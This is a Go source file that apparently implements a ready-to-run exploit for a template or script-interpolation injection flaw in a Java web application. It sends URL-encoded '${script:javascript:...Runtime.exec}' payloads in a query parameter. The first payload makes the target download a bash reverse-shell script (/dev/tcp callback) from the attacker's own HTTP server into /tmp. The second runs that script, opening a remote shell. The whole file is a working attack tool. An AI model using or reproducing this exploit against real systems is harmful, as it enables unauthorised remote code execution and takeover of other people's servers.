package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"time"
)

type Flag struct {
	Ip        *string
	Port      *string
	Endpoint  *string
	Parameter *string
	LocalIp   *string
	LocalPort *string
}

var (
	userFlags      *Flag
	URL            string
	Payload        string
	UploadPayload  = "upload"
	ReversePayload = "reverse"
	WebPort        = ":80" // Update this port for the web server if already in use
)

func main() {
	parseFlags()

	buildUrl()

	craftShellScript()
	fmt.Println("[+] Reverse script has been crafted")

	fmt.Printf("[+] Starting server on port %s\n", WebPort)
	go startHTTPServer(WebPort)
	time.Sleep(time.Second * 1)

	fmt.Println("[+] Attempting to save the script on target")
	craftExploit(UploadPayload)
	uploadUrl := fmt.Sprintf("%s%s", URL, Payload)
	makeGetRequest(uploadUrl)
	time.Sleep(time.Second * 1)

	fmt.Println("[+] Attempting to run script on target, check your listener")
	craftExploit(ReversePayload)
	reverseUrl := fmt.Sprintf("%s%s", URL, Payload)
	makeGetRequest(reverseUrl)

	select {}
}

func parseFlags() {
	flags := Flag{
		Ip:        flag.String("ip", "", "target url including parameter to inject"),
		Port:      flag.String("port", "8000", "port where the app is running"),
		Endpoint:  flag.String("endpoint", "", "endpoint to target"),
		Parameter: flag.String("parameter", "", "parameter to inject payload"),
		LocalIp:   flag.String("local-ip", "", "ip to listen on for reverse shell"),
		LocalPort: flag.String("local-port", "4444", "port to listen on for reverse shell"),
	}

	helpFlag := flag.Bool("help", false, "display this help message")

	flag.Parse()

	if *helpFlag {
		flag.Usage()
		os.Exit(0)
	}

	if *flags.Ip == "" || *flags.Endpoint == "" || *flags.Parameter == "" || *flags.LocalIp == "" || *flags.LocalPort == "" {
		fmt.Println("Error: All required flags must be set.")
		fmt.Println("Example: --ip 192.168.3.2 --port 9999 --endpoint /search --parameter query --local-ip 192.168.45.222 --local-port 4444")
		flag.Usage()
		os.Exit(0)
	}

	userFlags = &flags
}

func buildUrl() {
	targetIp := *userFlags.Ip
	targetPort := *userFlags.Port
	targetEndpoint := *userFlags.Endpoint
	targetParameter := *userFlags.Parameter

	url := fmt.Sprintf("http://%s:%s%s?%s=", targetIp, targetPort, targetEndpoint, targetParameter)
	URL = url
}

func craftExploit(payloadType string) {
	var exploit string
	if payloadType == UploadPayload {
		localIp := *userFlags.LocalIp
		exploit = "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20" + localIp + "%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D"
		Payload = exploit
		return
	}

	exploit = "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D"
	Payload = exploit

}

func craftShellScript() {
	shellText := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", *userFlags.LocalIp, *userFlags.LocalPort)
	os.WriteFile("shell", []byte(shellText), 0666)
}

func startHTTPServer(port string) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("[+] Script saved on target")
		http.ServeFile(w, r, r.URL.Path[1:])
	})

	go func() {
		fmt.Println("[+] HTTP server started")
		err := http.ListenAndServe(port, nil)
		if err != nil {
			fmt.Println("Error starting HTTP server:", err)
		}
	}()
}

func makeGetRequest(url string) {
	_, err := http.Get(url)
	if err != nil {
		fmt.Println("Error making GET request:", err)
		return
	}
}
